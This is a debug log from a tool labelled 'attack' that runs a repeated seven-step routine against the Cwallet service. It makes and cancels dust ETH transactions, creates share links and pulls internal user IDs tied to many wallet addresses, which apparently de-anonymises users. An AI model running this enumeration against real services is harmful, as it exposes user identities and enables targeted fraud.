2026-03-06 23:57:03,047 | DEBUG | attack | Step 4: Fetching transaction ID
2026-03-06 23:57:11,830 | DEBUG | attack | Step 1: Checking internal address
2026-03-06 23:57:11,985 | DEBUG | attack | Share link created: https://s.cwallet.com/1a2afuw
2026-03-06 23:57:11,986 | DEBUG | attack | Step 6: Canceling transaction
2026-03-06 23:57:12,106 | DEBUG | attack | Share link created: https://s.cwallet.com/1ao00g2
2026-03-06 23:57:12,107 | DEBUG | attack | Step 6: Canceling transaction
2026-03-06 23:57:12,232 | DEBUG | attack | Transaction canceled successfully
2026-03-06 23:57:12,235 | DEBUG | attack | Step 7: Getting user ID from share link
2026-03-06 23:57:12,364 | DEBUG | attack | Transaction result: {'bill_id': '202603062157272030040085176025088', 'type': 3}
2026-03-06 23:57:12,366 | DEBUG | attack | Step 4: Fetching transaction ID
2026-03-06 23:57:12,473 | DEBUG | attack | Generated billId: 202603062157282030040091740110848
2026-03-06 23:57:12,474 | DEBUG | attack | Step 3: Making transaction
2026-03-06 23:57:13,168 | DEBUG | attack | Address confirmed as internal
2026-03-06 23:57:13,210 | DEBUG | attack | Step 2: Generating new bill ID
2026-03-06 23:57:13,309 | DEBUG | attack | Step 2: Generating new bill ID
2026-03-06 23:57:13,432 | DEBUG | attack | Transaction ID: 202603062157282030040090655481856
2026-03-06 23:57:13,433 | DEBUG | attack | Step 5: Creating transaction share link
2026-03-06 23:57:13,538 | DEBUG | attack | Extracted userId: 30556661
2026-03-06 23:57:13,552 | DEBUG | attack | Transaction canceled successfully
2026-03-06 23:57:13,554 | DEBUG | attack | Step 7: Getting user ID from share link
2026-03-06 23:57:13,703 | DEBUG | attack | Transaction canceled successfully
2026-03-06 23:57:13,704 | DEBUG | attack | Step 7: Getting user ID from share link
2026-03-06 23:57:13,794 | DEBUG | attack | Starting executeFullTransaction
2026-03-06 23:57:13,796 | DEBUG | attack | Target address: 0xec47c8e67b143d9930c9bf2dc99007233411ae32 | Amount: 0.00000001 | Coin: ETH
2026-03-06 23:57:13,796 | DEBUG | attack | Step 1: Checking internal address
2026-03-06 23:57:13,894 | DEBUG | attack | Transaction result: {'bill_id': '202603062157282030040091740110848', 'type': 3}
2026-03-06 23:57:13,895 | DEBUG | attack | Step 4: Fetching transaction ID
2026-03-06 23:57:14,392 | DEBUG | attack | Step 2: Generating new bill ID
2026-03-06 23:57:14,516 | DEBUG | attack | Generated billId: 202603062157312030040101865160704
2026-03-06 23:57:14,517 | DEBUG | attack | Step 3: Making transaction
2026-03-06 23:57:14,633 | DEBUG | attack | Generated billId: 202603062157312030040101802246144
2026-03-06 23:57:14,634 | DEBUG | attack | Step 3: Making transaction
2026-03-06 23:57:14,740 | DEBUG | attack | Extracted userId: 32668945
2026-03-06 23:57:14,751 | DEBUG | attack | Starting executeFullTransaction
2026-03-06 23:57:14,751 | DEBUG | attack | Target address: 0x266593a09a2148592dc6a87651076062731aae12 | Amount: 0.00000001 | Coin: ETH
2026-03-06 23:57:14,752 | DEBUG | attack | Step 1: Checking internal address
2026-03-06 23:57:14,987 | DEBUG | attack | Extracted userId: 50749085
2026-03-06 23:57:14,997 | DEBUG | attack | Share link created: https://s.cwallet.com/16cd87k
2026-03-06 23:57:15,000 | DEBUG | attack | Step 6: Canceling transaction
2026-03-06 23:57:15,186 | DEBUG | attack | Transaction ID: 202603062157302030040097156657152
2026-03-06 23:57:15,193 | DEBUG | attack | Step 5: Creating transaction share link
2026-03-06 23:57:15,301 | DEBUG | attack | Address confirmed as internal
2026-03-06 23:57:15,305 | DEBUG | attack | Starting executeFullTransaction
2026-03-06 23:57:15,306 | DEBUG | attack | Target address: 0xa4f19a42a7455a8267c897ad321e6dc1df6fad3b | Amount: 0.00000001 | Coin: ETH
2026-03-06 23:57:15,306 | DEBUG | attack | Step 1: Checking internal address
2026-03-06 23:57:15,947 | DEBUG | attack | Generated billId: 202603062157322030040107871404032
2026-03-06 23:57:15,948 | DEBUG | attack | Step 3: Making transaction
2026-03-06 23:57:16,061 | DEBUG | attack | Step 2: Generating new bill ID
2026-03-06 23:57:16,172 | DEBUG | attack | Address confirmed as internal
2026-03-06 23:57:16,175 | DEBUG | attack | Address confirmed as internal
2026-03-06 23:57:16,177 | DEBUG | attack | Share link created: https://s.cwallet.com/1d8hean
2026-03-06 23:57:16,179 | DEBUG | attack | Step 6: Canceling transaction
2026-03-06 23:57:16,330 | DEBUG | attack | Transaction result: {'bill_id': '202603062157312030040101865160704', 'type': 3}
2026-03-06 23:57:16,331 | DEBUG | attack | Step 4: Fetching transaction ID
2026-03-06 23:57:16,435 | DEBUG | attack | Transaction canceled successfully
2026-03-06 23:57:16,436 | DEBUG | attack | Step 7: Getting user ID from share link
2026-03-06 23:57:16,543 | DEBUG | attack | Transaction result: {'bill_id': '202603062157312030040101802246144', 'type': 3}
2026-03-06 23:57:16,544 | DEBUG | attack | Step 4: Fetching transaction ID
2026-03-06 23:57:17,082 | DEBUG | attack | Generated billId: 202603062157332030040112376086528
2026-03-06 23:57:17,083 | DEBUG | attack | Step 3: Making transaction
2026-03-06 23:57:17,227 | DEBUG | attack | Transaction result: {'bill_id': '202603062157322030040107871404032', 'type': 3}
2026-03-06 23:57:17,228 | DEBUG | attack | Step 4: Fetching transaction ID
2026-03-06 23:57:17,329 | DEBUG | attack | Transaction ID: 202603062157322030040108451913728
2026-03-06 23:57:17,330 | DEBUG | attack | Step 5: Creating transaction share link
2026-03-06 23:57:17,440 | DEBUG | attack | Step 2: Generating new bill ID
2026-03-06 23:57:17,553 | DEBUG | attack | Transaction ID: 202603062157322030040108640657408
2026-03-06 23:57:17,554 | DEBUG | attack | Step 5: Creating transaction share link
2026-03-06 23:57:17,651 | DEBUG | attack | Extracted userId: 46701668
2026-03-06 23:57:17,665 | DEBUG | attack | Transaction canceled successfully
2026-03-06 23:57:17,671 | DEBUG | attack | Step 7: Getting user ID from share link
2026-03-06 23:57:17,776 | DEBUG | attack | Starting executeFullTransaction
2026-03-06 23:57:17,777 | DEBUG | attack | Target address: 0xc2bb4e063d973790998e79200d8a2dfa94982fa4 | Amount: 0.00000001 | Coin: ETH
2026-03-06 23:57:17,777 | DEBUG | attack | Step 1: Checking internal address
2026-03-06 23:57:18,523 | DEBUG | attack | Transaction ID: 202603062157332030040112579108864
2026-03-06 23:57:18,524 | DEBUG | attack | Step 5: Creating transaction share link
2026-03-06 23:57:18,593 | DEBUG | attack | Generated billId: 202603062157352030040118487187456
2026-03-06 23:57:18,595 | DEBUG | attack | Step 3: Making transaction
2026-03-06 23:57:18,693 | DEBUG | attack | Share link created: https://s.cwallet.com/19h8zxb
2026-03-06 23:57:18,694 | DEBUG | attack | Step 6: Canceling transaction
2026-03-06 23:57:18,787 | DEBUG | attack | Share link created: https://s.cwallet.com/1da75ok
2026-03-06 23:57:18,788 | DEBUG | attack | Step 6: Canceling transaction
2026-03-06 23:57:18,880 | DEBUG | attack | Step 2: Generating new bill ID
2026-03-06 23:57:18,965 | DEBUG | attack | Step 2: Generating new bill ID
2026-03-06 23:57:19,065 | DEBUG | attack | Address confirmed as internal
2026-03-06 23:57:19,067 | DEBUG | attack | Transaction result: {'bill_id': '202603062157332030040112376086528', 'type': 3}
2026-03-06 23:57:19,068 | DEBUG | attack | Step 4: Fetching transaction ID
2026-03-06 23:57:19,192 | DEBUG | attack | Extracted userId: 57286216
2026-03-06 23:57:19,198 | DEBUG | attack | Starting executeFullTransaction
2026-03-06 23:57:19,199 | DEBUG | attack | Target address: 0x3610edae72e97ea4b544407550fa56781945240d | Amount: 0.00000001 | Coin: ETH
2026-03-06 23:57:19,199 | DEBUG | attack | Step 1: Checking internal address
2026-03-06 23:57:20,030 | DEBUG | attack | Address confirmed as internal
2026-03-06 23:57:20,062 | DEBUG | attack | Generated billId: 202603062157362030040124883501056
2026-03-06 23:57:20,065 | DEBUG | attack | Step 3: Making transaction
2026-03-06 23:57:20,191 | DEBUG | attack | Generated billId: 202603062157362030040125160325120
2026-03-06 23:57:20,192 | DEBUG | attack | Step 3: Making transaction
2026-03-06 23:57:20,295 | DEBUG | attack | Share link created: https://s.cwallet.com/14loqi4
2026-03-06 23:57:20,296 | DEBUG | attack | Step 6: Canceling transaction
2026-03-06 23:57:20,393 | DEBUG | attack | Transaction canceled successfully
2026-03-06 23:57:20,395 | DEBUG | attack | Step 7: Getting user ID from share link
2026-03-06 23:57:20,502 | DEBUG | attack | Transaction canceled successfully
2026-03-06 23:57:20,503 | DEBUG | attack | Step 7: Getting user ID from share link
2026-03-06 23:57:20,598 | DEBUG | attack | Transaction ID: 202603062157352030040118442745856
2026-03-06 23:57:20,599 | DEBUG | attack | Step 5: Creating transaction share link
2026-03-06 23:57:20,685 | DEBUG | attack | Transaction result: {'bill_id': '202603062157352030040118487187456', 'type': 3}
2026-03-06 23:57:20,687 | DEBUG | attack | Step 4: Fetching transaction ID
2026-03-06 23:57:21,438 | DEBUG | attack | Extracted userId: 54482217
2026-03-06 23:57:21,439 | DEBUG | attack | Starting executeFullTransaction
2026-03-06 23:57:21,440 | DEBUG | attack | Target address: 0x4a98796a354fb3ca23b39d7efb3d8304656ea093 | Amount: 0.00000001 | Coin: ETH
2026-03-06 23:57:21,440 | DEBUG | attack | Step 1: Checking internal address
2026-03-06 23:57:21,595 | DEBUG | attack | Transaction ID: 202603062157362030040125208162304
2026-03-06 23:57:21,596 | DEBUG | attack | Step 5: Creating transaction share link
2026-03-06 23:57:21,685 | DEBUG | attack | Extracted userId: 47057429
2026-03-06 23:57:21,686 | DEBUG | attack | Share link created: https://s.cwallet.com/1chfncx
2026-03-06 23:57:21,687 | DEBUG | attack | Step 6: Canceling transaction
2026-03-06 23:57:21,792 | DEBUG | attack | Transaction canceled successfully
2026-03-06 23:57:21,793 | DEBUG | attack | Step 7: Getting user ID from share link
2026-03-06 23:57:21,889 | DEBUG | attack | Starting executeFullTransaction
2026-03-06 23:57:21,890 | DEBUG | attack | Target address: 0xdf4ff67ce7ad49a7047364d48a3021f38d4d9ac1 | Amount: 0.00000001 | Coin: ETH
2026-03-06 23:57:21,891 | DEBUG | attack | Step 1: Checking internal address
2026-03-06 23:57:21,976 | DEBUG | attack | Step 2: Generating new bill ID
2026-03-06 23:57:22,066 | DEBUG | attack | Transaction result: {'bill_id': '202603062157362030040124883501056', 'type': 3}
2026-03-06 23:57:22,067 | DEBUG | attack | Step 4: Fetching transaction ID
2026-03-06 23:57:22,165 | DEBUG | attack | Transaction result: {'bill_id': '202603062157362030040125160325120', 'type': 3}
2026-03-06 23:57:22,167 | DEBUG | attack | Step 4: Fetching transaction ID
2026-03-06 23:57:22,873 | DEBUG | attack | Step 2: Generating new bill ID
2026-03-06 23:57:22,983 | DEBUG | attack | Extracted userId: 55340000
2026-03-06 23:57:22,986 | DEBUG | attack | Transaction ID: 202603062157382030040131008884736
2026-03-06 23:57:22,988 | DEBUG | attack | Step 5: Creating transaction share link
2026-03-06 23:57:23,110 | DEBUG | attack | Address confirmed as internal
2026-03-06 23:57:23,111 | DEBUG | attack | Starting executeFullTransaction
2026-03-06 23:57:23,113 | DEBUG | attack | Target address: 0xc8ecd01247e8f6ae33eea503e445c0f3b189c137 | Amount: 0.00000001 | Coin: ETH
2026-03-06 23:57:23,115 | DEBUG | attack | Step 1: Checking internal address
2026-03-06 23:57:23,210 | DEBUG | attack | Address confirmed as internal
2026-03-06 23:57:23,212 | DEBUG | attack | Generated billId: 202603062157392030040137348972544
2026-03-06 23:57:23,213 | DEBUG | attack | Step 3: Making transaction
2026-03-06 23:57:23,337 | DEBUG | attack | Transaction ID: 202603062157382030040131189239808
2026-03-06 23:57:23,338 | DEBUG | attack | Step 5: Creating transaction share link
2026-03-06 23:57:23,433 | DEBUG | attack | Share link created: https://s.cwallet.com/140vwsj
2026-03-06 23:57:23,434 | DEBUG | attack | Step 6: Canceling transaction
2026-03-06 23:57:23,521 | DEBUG | attack | Transaction canceled successfully
2026-03-06 23:57:23,522 | DEBUG | attack | Step 7: Getting user ID from share link
2026-03-06 23:57:24,267 | DEBUG | attack | Extracted userId: 58154514
2026-03-06 23:57:24,269 | DEBUG | attack | Starting executeFullTransaction
2026-03-06 23:57:24,269 | DEBUG | attack | Target address: 0xcad110b520ddfc7e227c82b19e7915d6311d9ecc | Amount: 0.00000001 | Coin: ETH
2026-03-06 23:57:24,269 | DEBUG | attack | Step 1: Checking internal address
2026-03-06 23:57:24,471 | DEBUG | attack | Generated billId: 202603062157412030040142847705088
2026-03-06 23:57:24,471 | DEBUG | attack | Step 3: Making transaction
2026-03-06 23:57:24,659 | DEBUG | attack | Share link created: https://s.cwallet.com/165whih
2026-03-06 23:57:24,660 | DEBUG | attack | Step 6: Canceling transaction
2026-03-06 23:57:24,765 | DEBUG | attack | Address confirmed as internal
2026-03-06 23:57:24,768 | DEBUG | attack | Share link created: https://s.cwallet.com/1a3grmg
2026-03-06 23:57:24,771 | DEBUG | attack | Step 6: Canceling transaction
2026-03-06 23:57:24,871 | DEBUG | attack | Transaction canceled successfully
2026-03-06 23:57:24,871 | DEBUG | attack | Step 7: Getting user ID from share link
2026-03-06 23:57:24,964 | DEBUG | attack | Transaction result: {'bill_id': '202603062157392030040137348972544', 'type': 3}
2026-03-06 23:57:24,965 | DEBUG | attack | Step 4: Fetching transaction ID
2026-03-06 23:57:25,479 | DEBUG | attack | Step 2: Generating new bill ID
2026-03-06 23:57:25,675 | DEBUG | attack | Address confirmed as internal
2026-03-06 23:57:25,773 | DEBUG | attack | Step 2: Generating new bill ID
2026-03-06 23:57:25,889 | DEBUG | attack | Extracted userId: 43464491
2026-03-06 23:57:25,892 | DEBUG | attack | Transaction canceled successfully
2026-03-06 23:57:25,893 | DEBUG | attack | Step 7: Getting user ID from share link
2026-03-06 23:57:26,002 | DEBUG | attack | Starting executeFullTransaction
2026-03-06 23:57:26,004 | DEBUG | attack | Target address: 0x432f02580156be00d2b8dcafa1eccd45db36be2b | Amount: 0.00000001 | Coin: ETH
2026-03-06 23:57:26,005 | DEBUG | attack | Step 1: Checking internal address
2026-03-06 23:57:26,185 | DEBUG | attack | Transaction result: {'bill_id': '202603062157412030040142847705088', 'type': 3}
2026-03-06 23:57:26,186 | DEBUG | attack | Step 4: Fetching transaction ID
2026-03-06 23:57:26,316 | DEBUG | attack | Transaction canceled successfully
2026-03-06 23:57:26,319 | DEBUG | attack | Step 7: Getting user ID from share link
2026-03-06 23:57:26,442 | DEBUG | attack | Transaction ID: 202603062157412030040143168167936
2026-03-06 23:57:26,444 | DEBUG | attack | Step 5: Creating transaction share link
2026-03-06 23:57:26,794 | DEBUG | attack | Generated billId: 202603062157432030040153035669504
2026-03-06 23:57:26,799 | DEBUG | attack | Step 3: Making transaction
2026-03-06 23:57:26,946 | DEBUG | attack | Step 2: Generating new bill ID
2026-03-06 23:57:27,488 | DEBUG | attack | Address confirmed as internal
2026-03-06 23:57:27,576 | DEBUG | attack | Extracted userId: 58353139
2026-03-06 23:57:27,577 | DEBUG | attack | Starting executeFullTransaction
2026-03-06 23:57:27,577 | DEBUG | attack | Target address: 0x51401dc573df35fc61b32fef97c2cef94fb30712 | Amount: 0.00000001 | Coin: ETH
2026-03-06 23:57:27,577 | DEBUG | attack | Step 1: Checking internal address
2026-03-06 23:57:27,800 | DEBUG | attack | Transaction ID: 202603062157422030040149073747968
2026-03-06 23:57:27,801 | DEBUG | attack | Step 5: Creating transaction share link
2026-03-06 23:57:27,905 | DEBUG | attack | Extracted userId: 18122687
2026-03-06 23:57:27,912 | DEBUG | attack | Starting executeFullTransaction
2026-03-06 23:57:27,912 | DEBUG | attack | Target address: 0x15a1575d07bb84c34e99ff655eba7141509d89b2 | Amount: 0.00000001 | Coin: ETH
2026-03-06 23:57:27,913 | DEBUG | attack | Step 1: Checking internal address
2026-03-06 23:57:28,036 | DEBUG | attack | Generated billId: 202603062157442030040156428861440
2026-03-06 23:57:28,049 | DEBUG | attack | Step 3: Making transaction
2026-03-06 23:57:28,195 | DEBUG | attack | Share link created: https://s.cwallet.com/15fftcq
2026-03-06 23:57:28,196 | DEBUG | attack | Step 6: Canceling transaction
2026-03-06 23:57:28,307 | DEBUG | attack | Generated billId: 202603062157442030040157682958336
2026-03-06 23:57:28,308 | DEBUG | attack | Step 3: Making transaction
2026-03-06 23:57:28,429 | DEBUG | attack | Transaction result: {'bill_id': '202603062157432030040153035669504', 'type': 3}
2026-03-06 23:57:28,431 | DEBUG | attack | Step 4: Fetching transaction ID
2026-03-06 23:57:28,608 | DEBUG | attack | Step 2: Generating new bill ID
2026-03-06 23:57:29,162 | DEBUG | attack | Address confirmed as internal
2026-03-06 23:57:29,288 | DEBUG | attack | Address confirmed as internal
2026-03-06 23:57:29,304 | DEBUG | attack | Share link created: https://s.cwallet.com/180ci34
2026-03-06 23:57:29,305 | DEBUG | attack | Step 6: Canceling transaction
2026-03-06 23:57:29,385 | DEBUG | attack | Transaction ID: 202603062157442030040158594822144
2026-03-06 23:57:29,385 | DEBUG | attack | Step 5: Creating transaction share link
2026-03-06 23:57:29,498 | DEBUG | attack | Generated billId: 202603062157462030040164347707392
2026-03-06 23:57:29,500 | DEBUG | attack | Step 3: Making transaction
2026-03-06 23:57:29,632 | DEBUG | attack | Transaction canceled successfully
2026-03-06 23:57:29,633 | DEBUG | attack | Step 7: Getting user ID from share link
2026-03-06 23:57:29,753 | DEBUG | attack | Transaction result: {'bill_id': '202603062157442030040156428861440', 'type': 3}
2026-03-06 23:57:29,755 | DEBUG | attack | Step 4: Fetching transaction ID
2026-03-06 23:57:29,874 | DEBUG | attack | Transaction result: {'bill_id': '202603062157442030040157682958336', 'type': 3}
2026-03-06 23:57:29,876 | DEBUG | attack | Step 4: Fetching transaction ID
2026-03-06 23:57:30,059 | DEBUG | attack | Step 2: Generating new bill ID
2026-03-06 23:57:30,708 | DEBUG | attack | Transaction canceled successfully
2026-03-06 23:57:30,710 | DEBUG | attack | Step 7: Getting user ID from share link
2026-03-06 23:57:30,842 | DEBUG | attack | Extracted userId: 54482069
2026-03-06 23:57:30,844 | DEBUG | attack | Transaction ID: 202603062157462030040163988697088
2026-03-06 23:57:30,844 | DEBUG | attack | Step 5: Creating transaction share link
2026-03-06 23:57:30,948 | DEBUG | attack | Transaction ID: 202603062157462030040164441681920
2026-03-06 23:57:30,949 | DEBUG | attack | Step 5: Creating transaction share link
2026-03-06 23:57:31,050 | DEBUG | attack | Share link created: https://s.cwallet.com/198bp5z
2026-03-06 23:57:31,051 | DEBUG | attack | Step 6: Canceling transaction
2026-03-06 23:57:31,154 | DEBUG | attack | Starting executeFullTransaction
2026-03-06 23:57:31,154 | DEBUG | attack | Target address: 0xe0c5870ed5a31e68bcb48b3e87383855ddabcd76 | Amount: 0.00000001 | Coin: ETH
2026-03-06 23:57:31,154 | DEBUG | attack | Step 1: Checking internal address
2026-03-06 23:57:31,255 | DEBUG | attack | Step 2: Generating new bill ID
2026-03-06 23:57:31,360 | DEBUG | attack | Generated billId: 202603062157472030040170366533632
2026-03-06 23:57:31,360 | DEBUG | attack | Step 3: Making transaction
2026-03-06 23:57:31,531 | DEBUG | attack | Transaction result: {'bill_id': '202603062157462030040164347707392', 'type': 3}
2026-03-06 23:57:31,532 | DEBUG | attack | Step 4: Fetching transaction ID
2026-03-06 23:57:31,659 | DEBUG | attack | Step 2: Generating new bill ID
2026-03-06 23:57:32,451 | DEBUG | attack | Extracted userId: 32384249
2026-03-06 23:57:32,460 | DEBUG | attack | Starting executeFullTransaction
2026-03-06 23:57:32,463 | DEBUG | attack | Target address: 0xae76dccb574c48e30373bd6977e6ee1a107c83be | Amount: 0.00000001 | Coin: ETH
2026-03-06 23:57:32,463 | DEBUG | attack | Step 1: Checking internal address
